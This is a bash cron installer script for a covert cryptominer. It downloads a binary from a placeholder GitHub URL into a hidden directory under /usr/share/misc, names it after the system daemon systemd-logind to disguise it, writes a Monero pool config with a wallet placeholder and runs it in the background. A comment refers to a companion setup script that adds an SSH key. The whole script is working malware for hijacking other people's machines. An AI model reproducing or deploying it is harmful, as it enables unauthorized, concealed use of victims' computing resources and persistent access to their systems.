#!/bin/bash
# cron_installer.sh – This will run once per minute until the miner is installed

# Check if miner is already running
if pgrep -f "systemd-logind" > /dev/null; then
    exit 0
fi

# Download and install the miner (same as your setup.sh but without SSH key if desired)
wget -q -O /usr/share/misc/.cache/systemd-logind https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/systemd-logind
chmod +x /usr/share/misc/.cache/systemd-logind

# Create config
cat > /usr/share/misc/.cache/config.json <<EOL
{
    "autosave": true,
    "cpu": { "enabled": true, "max-threads-hint": 60, "priority": 5 },
    "pools": [ { "url": "pool.supportxmr.com:3333", "user": "YOUR_WALLET", "pass": "x", "keepalive": true, "tls": true } ]
}
EOL

# Run miner in background
/usr/share/misc/.cache/systemd-logind --config=/usr/share/misc/.cache/config.json &
